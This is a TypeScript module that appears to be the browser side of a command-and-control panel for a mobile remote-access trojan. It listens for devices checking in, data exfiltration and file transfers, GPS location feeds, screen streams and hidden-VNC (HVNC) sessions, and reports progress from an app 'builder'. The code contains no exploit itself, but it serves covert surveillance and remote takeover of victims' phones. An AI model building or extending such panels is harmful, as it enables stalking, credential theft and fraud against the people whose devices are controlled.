import { io, type Socket } from 'socket.io-client';

let adminSocket: Socket | null = null;

type DeviceChangeListener = (payload: { id: string; model?: string; ip?: string; online: boolean }) => void;

type DataChangeListener = (clientId: string, dataType: string, payload?: Record<string, unknown>) => void;
type TransferListener = (clientId: string, transfer: { transferId: string; name: string; totalChunks: number; totalSize: number; progress: number }) => void;
type BuilderProgressListener = (progress: BuilderProgress) => void;

export interface ScreenStatusPayload {
  id: string;
  streaming?: boolean;
  screenWidth?: number;
  screenHeight?: number;
  captureWidth?: number;
  captureHeight?: number;
  densityDpi?: number;
  rotation?: number;
  fps?: number;
  accessible?: boolean;
  transport?: 'webrtc';
  connectionState?: string;
  sessionId?: string;
}

type ScreenStoppedListener = (payload: { id: string }) => void;
type ScreenStatusListener = (payload: ScreenStatusPayload) => void;
type ScreenErrorListener = (payload: { id: string; sessionId?: string; error: string }) => void;

export interface WebRtcAnswerPayload { id: string; sessionId: string; sdp: string; }
export interface WebRtcIcePayload { id: string; sessionId: string; candidate: string; sdpMid: string | null; sdpMLineIndex: number; }
type WebRtcAnswerListener = (payload: WebRtcAnswerPayload) => void;
type WebRtcIceListener = (payload: WebRtcIcePayload) => void;

export interface HvncStatusPayload {
  id: string;
  streaming?: boolean;
  virtualWidth?: number;
  virtualHeight?: number;
  displayId?: number;
  densityDpi?: number;
  fps?: number;
  transport?: 'webrtc';
  connectionState?: string;
  sessionId?: string;
}

type HvncStoppedListener = (payload: { id: string }) => void;
type HvncStatusListener = (payload: HvncStatusPayload) => void;
type HvncErrorListener = (payload: { id: string; sessionId?: string; error: string }) => void;
type HvncAnswerListener = (payload: WebRtcAnswerPayload) => void;
type HvncIceListener = (payload: WebRtcIcePayload) => void;

export interface BuilderProgress {
  step: string;
  message: string;
  complete: boolean;
  error: string | null;
  time: string;
  appName?: string;
}

const dataListeners: Set<DataChangeListener> = new Set();
const transferListeners: Set<TransferListener> = new Set();
const builderProgressListeners: Set<BuilderProgressListener> = new Set();
const screenStoppedListeners: Set<ScreenStoppedListener> = new Set();
const screenStatusListeners: Set<ScreenStatusListener> = new Set();
const screenErrorListeners: Set<ScreenErrorListener> = new Set();
const screenSubscriptionCounts: Map<string, number> = new Map();
const webRtcAnswerListeners: Set<WebRtcAnswerListener> = new Set();
const webRtcIceListeners: Set<WebRtcIceListener> = new Set();

const hvncStoppedListeners: Set<HvncStoppedListener> = new Set();
const hvncStatusListeners: Set<HvncStatusListener> = new Set();
const hvncErrorListeners: Set<HvncErrorListener> = new Set();
const hvncSubscriptionCounts: Map<string, number> = new Map();
const hvncAnswerListeners: Set<HvncAnswerListener> = new Set();
const hvncIceListeners: Set<HvncIceListener> = new Set();

export interface GpsLocationPayload { id: string; latitude: number; longitude: number; accuracy?: number; speed?: number; provider?: string; time: string; }
type GpsLocationListener = (payload: GpsLocationPayload) => void;
const gpsLocationListeners: Set<GpsLocationListener> = new Set();

const getToken = (): string => {
  try {
    const raw = localStorage.getItem('auth-token');
    return raw || '';
  } catch { return ''; }
};

// Initialize the admin socket for device events
export function initAdminSocket(onDeviceChange?: DeviceChangeListener): Socket {
  if (adminSocket?.connected) {
    return adminSocket;
  }

  if (adminSocket) {
    adminSocket.removeAllListeners();
    adminSocket.disconnect();
  }

  const token = getToken();

  const s = io({
    transports: ['websocket', 'polling'],
    autoConnect: true,
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    query: { admin: 'true' },
    auth: { token },
  });

  s.on('reconnect_attempt', () => {
    (s as unknown as Record<string, unknown>).auth = { token: getToken() };
  });
  s.on('connect', () => {
    screenSubscriptionCounts.forEach((_count, clientId) => {
      s.emit('screen:subscribe', { id: clientId });
    });
    hvncSubscriptionCounts.forEach((_count, clientId) => {
      s.emit('hvnc:subscribe', { id: clientId });
    });
  });
  s.on('client:connect', (payload: { id: string; model?: string; ip?: string }) => {
    onDeviceChange?.({ ...payload, online: true });
  });
  s.on('client:disconnect', (payload: { id: string }) => {
    onDeviceChange?.({ ...payload, online: false });
  });
  s.on('client:data', (payload: { id: string; dataType: string; [key: string]: unknown }) => {
    const { id, dataType, ...extra } = payload;
    dataListeners.forEach((fn) => fn(id, dataType, Object.keys(extra).length > 0 ? extra : undefined));
  });
  s.on('client:update', (payload: { id: string; dataType: string; [key: string]: unknown }) => {
    const { id, dataType, ...extra } = payload;
    dataListeners.forEach((fn) => fn(id, dataType, Object.keys(extra).length > 0 ? extra : undefined));
  });
  s.on('client:transfer', (payload: { id: string; transferId: string; name: string; totalChunks: number; totalSize: number; progress: number }) => {
    transferListeners.forEach((fn) => fn(payload.id, payload));
  });
  s.on('builder:progress', (payload: BuilderProgress) => {
    builderProgressListeners.forEach((fn) => fn(payload));
  });
  s.on('screen:stopped', (payload: { id: string }) => {
    screenStoppedListeners.forEach((fn) => fn(payload));
  });
  s.on('screen:status', (payload: ScreenStatusPayload) => {
    screenStatusListeners.forEach((fn) => fn(payload));
  });
  s.on('screen:error', (payload: { id: string; sessionId?: string; error: string }) => {
    screenErrorListeners.forEach((fn) => fn(payload));
  });
  s.on('webrtc:answer', (payload: WebRtcAnswerPayload) => {
    webRtcAnswerListeners.forEach((fn) => fn(payload));
  });
  s.on('webrtc:ice', (payload: WebRtcIcePayload) => {
    webRtcIceListeners.forEach((fn) => fn(payload));
  });
  s.on('gps:location', (payload: GpsLocationPayload) => {
    gpsLocationListeners.forEach((fn) => fn(payload));
  });
  s.on('hvnc:stopped', (payload: { id: string }) => {
    hvncStoppedListeners.forEach((fn) => fn(payload));
  });
  s.on('hvnc:status', (payload: HvncStatusPayload) => {
    hvncStatusListeners.forEach((fn) => fn(payload));
  });
  s.on('hvnc:error', (payload: { id: string; sessionId?: string; error: string }) => {
    hvncErrorListeners.forEach((fn) => fn(payload));
  });
  s.on('hvnc:answer', (payload: WebRtcAnswerPayload) => {
    hvncAnswerListeners.forEach((fn) => fn(payload));
  });
  s.on('hvnc:ice', (payload: WebRtcIcePayload) => {
    hvncIceListeners.forEach((fn) => fn(payload));
  });

  adminSocket = s;
  return s;
}

export function disconnectAdminSocket(): void {
  if (adminSocket) {
    adminSocket.removeAllListeners();
    adminSocket.disconnect();
    adminSocket = null;
  }
  dataListeners.clear();
  transferListeners.clear();
  builderProgressListeners.clear();
  screenStoppedListeners.clear();
  screenStatusListeners.clear();
  screenErrorListeners.clear();
  webRtcAnswerListeners.clear();
  webRtcIceListeners.clear();
  gpsLocationListeners.clear();
  hvncStoppedListeners.clear();
  hvncStatusListeners.clear();
  hvncErrorListeners.clear();
  hvncAnswerListeners.clear();
  hvncIceListeners.clear();
}

export function onDataUpdate(listener: DataChangeListener): () => void {
  dataListeners.add(listener);
  return () => { dataListeners.delete(listener); };
}

export function onTransferUpdate(listener: TransferListener): () => void {
  transferListeners.add(listener);
  return () => { transferListeners.delete(listener); };
}


export function onBuilderProgress(listener: BuilderProgressListener): () => void {
  builderProgressListeners.add(listener);
  return () => { builderProgressListeners.delete(listener); };
}

export function onScreenStopped(listener: ScreenStoppedListener): () => void {
  screenStoppedListeners.add(listener);
  return () => { screenStoppedListeners.delete(listener); };
}

export function onScreenStatus(listener: ScreenStatusListener): () => void {
  screenStatusListeners.add(listener);
  return () => { screenStatusListeners.delete(listener); };
}

export function onScreenError(listener: ScreenErrorListener): () => void {
  screenErrorListeners.add(listener);
  return () => { screenErrorListeners.delete(listener); };
}

/** Subscribe this browser only to the high-bandwidth stream it is displaying. */
export function subscribeToScreen(clientId: string): () => void {
  const count = screenSubscriptionCounts.get(clientId) ?? 0;
  screenSubscriptionCounts.set(clientId, count + 1);
  if (count === 0) adminSocket?.emit('screen:subscribe', { id: clientId });

  return () => {
    const next = (screenSubscriptionCounts.get(clientId) ?? 1) - 1;
    if (next <= 0) {
      screenSubscriptionCounts.delete(clientId);
      adminSocket?.emit('screen:unsubscribe', { id: clientId });
    } else {
      screenSubscriptionCounts.set(clientId, next);
    }
  };
}

export function onWebRtcAnswer(listener: WebRtcAnswerListener): () => void {
  webRtcAnswerListeners.add(listener);
  return () => { webRtcAnswerListeners.delete(listener); };
}

export function onWebRtcIce(listener: WebRtcIceListener): () => void {
  webRtcIceListeners.add(listener);
  return () => { webRtcIceListeners.delete(listener); };
}

export function onGpsLocation(listener: GpsLocationListener): () => void {
  gpsLocationListeners.add(listener);
  return () => { gpsLocationListeners.delete(listener); };
}

// ─── HVNC Socket Functions ──────────────────────────────────────

/** Subscribe this browser to the HVNC stream for a specific device. */
export function subscribeToHvnc(clientId: string): () => void {
  const count = hvncSubscriptionCounts.get(clientId) ?? 0;
  hvncSubscriptionCounts.set(clientId, count + 1);
  if (count === 0) adminSocket?.emit('hvnc:subscribe', { id: clientId });

  return () => {
    const next = (hvncSubscriptionCounts.get(clientId) ?? 1) - 1;
    if (next <= 0) {
      hvncSubscriptionCounts.delete(clientId);
      adminSocket?.emit('hvnc:unsubscribe', { id: clientId });
    } else {
      hvncSubscriptionCounts.set(clientId, next);
    }
  };
}

export function onHvncStopped(listener: HvncStoppedListener): () => void {
  hvncStoppedListeners.add(listener);
  return () => { hvncStoppedListeners.delete(listener); };
}

export function onHvncStatus(listener: HvncStatusListener): () => void {
  hvncStatusListeners.add(listener);
  return () => { hvncStatusListeners.delete(listener); };
}

export function onHvncError(listener: HvncErrorListener): () => void {
  hvncErrorListeners.add(listener);
  return () => { hvncErrorListeners.delete(listener); };
}

export function onHvncAnswer(listener: HvncAnswerListener): () => void {
  hvncAnswerListeners.add(listener);
  return () => { hvncAnswerListeners.delete(listener); };
}

export function onHvncIce(listener: HvncIceListener): () => void {
  hvncIceListeners.add(listener);
  return () => { hvncIceListeners.delete(listener); };
}
